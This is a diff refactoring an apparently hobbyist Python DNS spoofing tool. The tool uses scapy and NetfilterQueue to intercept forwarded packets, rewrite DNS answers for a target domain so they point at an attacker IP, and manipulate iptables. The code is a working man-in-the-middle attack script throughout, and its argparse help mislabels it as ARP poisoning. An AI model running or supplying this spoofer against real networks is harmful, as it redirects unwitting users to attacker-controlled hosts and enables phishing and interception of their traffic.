@@ -1,44 +1,22 @@
 #!/usr/bin/env python3
 
+import os
+import subprocess
+import argparse
 import scapy.all as scapy
 from netfilterqueue import NetfilterQueue
-import subprocess
-import os
+from rules import enable_ip_forwarding, set_trap_for_forward_packets, flush_rules
 
-# Configuration
-TARGET_URL = "bing.com"             # Target domain to spoof
-ATTACKER_IP = "192.168.2.11"        # IP address to redirect the target to
-QUEUE_NUM = 0                       # Netfilter Queue number
+def parse_args():
+    p = argparse.ArgumentParser(description="ARP Poisoning Tool")
+    p.add_argument("--target-url", default="bing.com", help="Target host URL to spoof")
+    p.add_argument("--attacker-ip", default="192.168.2.254", help="IP address to redirect the target to")
+    p.add_argument("--queue-num", type=int, default=0, help="Netfilter Queue number")
+    return p.parse_args()
 
-def set_rules():
+def process_packet(packet, target_url):
     """
-    Enable IP forwarding and set iptables to trap packets (Linux only).
-    """
-    print("[*] Configuring iptables rules...")
-    
-    # Enable IP Forwarding automatically
-    try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("1")
-        print("[*] IP Forwarding enabled.")
-    except Exception as e:
-        print(f"[!] Could not enable IP forwarding automatically: {e}")
-        print("[!] Please run: echo 1 > /proc/sys/net/ipv4/ip_forward")
-    
-    # Insert the rule into the FORWARD chain
-    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(QUEUE_NUM)])
-
-def flush_rules():
-    """
-    Clear the iptables rules to restore normal network flow (Linux only).
-    """
-    print("\n[*] Flushing iptables rules...")
-    subprocess.run(["iptables", "--flush"])
-    print("[+] Rules flushed. Network normalized.")
-
-def process_packet(packet):
-    """
-    Callback function to process each packet in the Netfilter Queue.
+    Callback function to process each packet in the Netfilter Queue. This function spoofs DNS responses for the target URL with the ATTACKER_IP.
 
     :param packet: The packet from the Netfilter Queue
     """
@@ -48,33 +26,35 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname.decode()
         
-        if TARGET_URL in qname:
+        if target_url in qname:
             print(f"[+] Spoofing target: {qname}")
             
             answer = scapy.DNSRR(rrname=qname, rdata=ATTACKER_IP)
+            # Modify the DNS answer
             scapy_packet[scapy.DNS].an = answer
+            # Modify the answer count
             scapy_packet[scapy.DNS].ancount = 1
             
+            # Delete length and checksum fields to force Scapy to recalculate them
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
             
+            # Set the modified packet back into the queue
             packet.set_payload(bytes(scapy_packet))
     
     packet.accept()
 
-# Main Execution
-if __name__ == "__main__":
+def main(TARGET_URL, ATTACKER_IP, QUEUE_NUM):
     try:
-        # Set up IP forwarding and iptables rules
-        set_rules()
+        enable_ip_forwarding()
+        set_trap_for_forward_packets(QUEUE_NUM)
 
-        print("[*] Starting DNS Spoofer...")
-        print(f"[*] Target: {TARGET_URL} -> Redirect to: {ATTACKER_IP}")
-        
+        print(f"[*] DNS Spoofing started. Target: {TARGET_URL} -> Redirect to: {ATTACKER_IP}")
+
         queue = NetfilterQueue()
-        queue.bind(QUEUE_NUM, process_packet)
+        queue.bind(QUEUE_NUM, lambda packet: process_packet(packet, TARGET_URL))
         queue.run()
 
     except KeyboardInterrupt:
@@ -86,3 +66,13 @@ if __name__ == "__main__":
     finally:
         # This block ALWAYS runs, even if the script crashes or we hit Ctrl+C
         flush_rules()
+
+# Main Execution
+if __name__ == "__main__":
+    args = parse_args()
+
+    TARGET_URL = args.target_url             # Target domain to spoof
+    ATTACKER_IP = args.attacker_ip           # IP address to redirect the target to
+    QUEUE_NUM = args.queue_num               # Netfilter Queue number
+
+    main(TARGET_URL, ATTACKER_IP, QUEUE_NUM)
